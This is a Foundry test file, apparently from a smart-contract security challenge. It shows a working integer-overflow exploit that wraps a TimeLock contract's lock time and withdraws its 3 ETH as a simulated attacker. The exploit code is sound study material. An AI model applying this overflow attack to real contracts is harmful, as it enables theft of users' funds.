// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; //< 0.8
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import "../src/TimeLock.sol";


//to run using foundry: forge test --match-contract TimeLockTest -vvvv
contract TimeLockTest is Test {
    TimeLock public timelock;
    address attacker = address(1);

    function setUp() public {
        // Deploy the TimeLock contract with 3 ETH
        timelock = (new TimeLock){value: 3 ether}();
    }

    // Helper function to check if the challenge is solved
    function isSolved() public view returns (bool) {
        // The challenge is solved if the contract balance is 0
        return address(timelock).balance == 0;
    }

    // Test for the overflow exploit
    function testOverflowExploit() public {
        //log contract balance before exploit
        console.log("Contract balance before exploit: ", address(timelock).balance);
        // Simulate the user increasing the lock time with a large value to trigger an overflow
        vm.prank(attacker); //act as the user msg.sender = user
        timelock.increaseLockTime(type(uint256).max - timelock.lockTime() + 1); 
        
        // User attempts to withdraw funds after bypassing the lock time
        vm.prank(attacker);
        timelock.withdraw();

        // Ensure the contract balance is now 0 after the withdrawal
        uint256 contractBalance = address(timelock).balance;
        console.log("Contract balance after exploit:", contractBalance);

        // Assert that the contract balance is 0 and the user successfully withdrew the funds
        assertEq(contractBalance, 0, "Contract balance should be 0 after withdrawal");

        // Check that the challenge is solved
        bool solved = isSolved();
        console.log("Challenge solved:", solved);
        assertTrue(solved, "Challenge should be solved after withdrawal");
    }

    function testcalculateOverflowValue() public pure returns (uint256) {
        uint256 maxValue = type(uint256).max;
        uint256 lockTime = 2044105692;
        uint256 overflowValue = maxValue - lockTime + 1;

        console.log("Max Value:", maxValue);
        console.log("Lock Time:", lockTime);
        console.log("Overflow Value:", overflowValue);

        return overflowValue;
    }

}
